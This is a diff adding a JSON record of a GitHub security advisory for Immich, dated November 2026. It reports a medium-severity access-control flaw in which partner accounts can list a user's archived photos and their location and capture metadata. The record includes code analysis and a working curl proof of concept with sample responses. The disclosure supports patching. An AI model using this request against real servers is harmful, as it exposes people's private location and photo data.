@@ -1,0 +1,47 @@
+{
+  "global": null,
+  "id": "GHSA-j722-3hvf-c9vr",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-200",
+      "CWE-639"
+    ],
+    "description": "## Summary\r\n\r\ni found that `GET /api/timeline/bucket` returns archived assets from the library owner to a partner account when `visibility` is omitted, a partner is supposed to receive only `timeline` assets. the response gives the archived asset id, visibility, thumbhash, GPS fields, capture time, ratio, type and live-photo linkage.\r\n\r\n## Code analysis\r\n\r\ni checked `timeBucketChecks()` first:\r\n\r\n```ts\r\nif (dto.userId) {\r\n  await this.requireAccess({ auth, permission: Permission.TimelineRead, ids: [dto.userId] });\r\n  if (dto.visibility === AssetVisibility.Archive) {\r\n    await this.requireAccess({ auth, permission: Permission.ArchiveRead, ids: [dto.userId] });\r\n  }\r\n}\r\n```\r\n\r\nthis is `server/src/services/timeline.service.ts:58-62`, `TimelineRead` accepts the partner user id through `server/src/utils/access.ts:265-269`, while `ArchiveRead` is self-only at `server/src/utils/access.ts:235-237`\r\n\r\nwhen `dto.visibility` is undefined, `server/src/repositories/asset.repository.ts:841` uses `withDefaultVisibility`, and `server/src/utils/database.ts:82-84` adds both `archive` and `timeline` to the query\r\n\r\nthe `withPartners` path filters archived assets at `timeline.service.ts:73-84`, the direct `userId` path does not, and per-asset partner access only grants `Timeline` and `Hidden` at `server/src/repositories/access.repository.ts:201-224`\r\n\r\n## Exploitation\r\n\r\ni reproduced this on a live Immich v3.0.0 server with the official Postgres vectorchord image, three standard accs , miau owns the library, cha is the partner, miau67 is unrelated\r\n\r\nmiau uploads `secret.jpg` and `public.jpg`, archives `SECRET_ID`, then adds cha as a partner, after that cha sends the request below without a `visibility` parameter\r\n\r\n## PoC\r\n\r\ncreate three standard accounts through the normal signup flow, miau owns the library, cha is the partner, miau67 is unrelated, then set their ids and tokens:\r\n\r\n```bash\r\n~/immich ❯ B=http://host:2283/api\r\n~/immich ❯ UA='Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'\r\n```\r\n\r\nupload `secret.jpg` and `public.jpg` as miau, keep the returned ids in `SECRET_ID` and `PUBLIC_ID`, archive `SECRET_ID`, then add cha as partner:\r\n\r\n```bash\r\n~/immich ❯ SECRET_ID=$(curl -s -A \"$UA\" -X POST \"$B/assets\" -H \"Authorization: Bearer $TOK_MIAU\" -F deviceAssetId=p1 -F deviceId=poc -F fileCreatedAt=2026-03-15T10:00:00.000Z -F fileModifiedAt=2026-03-15T10:00:00.000Z -F 'assetData=@secret.jpg' | jq -r .id)\r\n~/immich ❯ PUBLIC_ID=$(curl -s -A \"$UA\" -X POST \"$B/assets\" -H \"Authorization: Bearer $TOK_MIAU\" -F deviceAssetId=p2 -F deviceId=poc -F fileCreatedAt=2026-03-15T11:00:00.000Z -F fileModifiedAt=2026-03-15T11:00:00.000Z -F 'assetData=@public.jpg' | jq -r .id)\r\n~/immich ❯ curl -s -A \"$UA\" -X PUT \"$B/assets\" -H \"Authorization: Bearer $TOK_MIAU\" -H 'Content-Type: application/json' -d \"{\\\"ids\\\":[\\\"$SECRET_ID\\\"],\\\"visibility\\\":\\\"archive\\\"}\"\r\n~/immich ❯ curl -s -A \"$UA\" -X POST \"$B/partners\" -H \"Authorization: Bearer $TOK_MIAU\" -H 'Content-Type: application/json' -d \"{\\\"sharedWithId\\\":\\\"$CHA_ID\\\"}\"\r\n```\r\n\r\nthe vulnerable request is:\r\n\r\n```bash\r\n~/immich ❯ curl -s -A \"$UA\" \"$B/timeline/bucket?timeBucket=2026-03-01&userId=$MIAU_ID&withCoordinates=true\" -H \"Authorization: Bearer $TOK_CHA\" | jq '{id, visibility, ownerId}'\r\n{\r\n  \"id\": [\"ae969c49-...\", \"75d2f680-...\"],\r\n  \"visibility\": [\"timeline\", \"archive\"],\r\n  \"ownerId\": [\"<MIAU_ID>\", \"<MIAU_ID>\"]\r\n}\r\n```\r\n\r\nthe `archive` entry is `SECRET_ID`, and `withCoordinates=true` also returns its `thumbhash`, `city`, `country`, `latitude`, `longitude`, `fileCreatedAt`, `ratio`, `isImage`, `livePhotoVideoId` and `projectionType`\r\n\r\nthe explicit archive request is rejected:\r\n\r\n```http\r\nHTTP 400\r\n{\"message\":\"Not found or no archive.read access\"}\r\n```\r\n\r\nthe same partner cannot read the asset or thumbnail:\r\n\r\n```http\r\nHTTP 400\r\n{\"message\":\"Not found or no asset.read access\"}\r\n\r\nHTTP 400\r\n{\"message\":\"Not found or no asset.view access\"}\r\n```\r\n\r\nan unrelated account is rejected by the timeline check:\r\n\r\n```http\r\nHTTP 400\r\n{\"message\":\"Not found or no timeline.read access\"}\r\n```\r\n\r\n## Impact\r\n\r\nany partner of a user can list that user's archived timeline metadata, including precise location and capture data, even though archive is the setting used to hide an asset from that partner",
+    "ghsa_id": "GHSA-j722-3hvf-c9vr",
+    "html_url": "https://github.com/immich-app/immich/security/advisories/GHSA-j722-3hvf-c9vr",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-j722-3hvf-c9vr"
+      }
+    ],
+    "published_at": "2026-11-10T18:45:30Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Immich partner reads archived timeline metadata",
+    "updated_at": "2026-11-10T19:27:18Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "immich"
+        },
+        "patched_versions": "v3.4.0",
+        "vulnerable_version_range": "<= v3.3.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "immich-app/immich"
+}
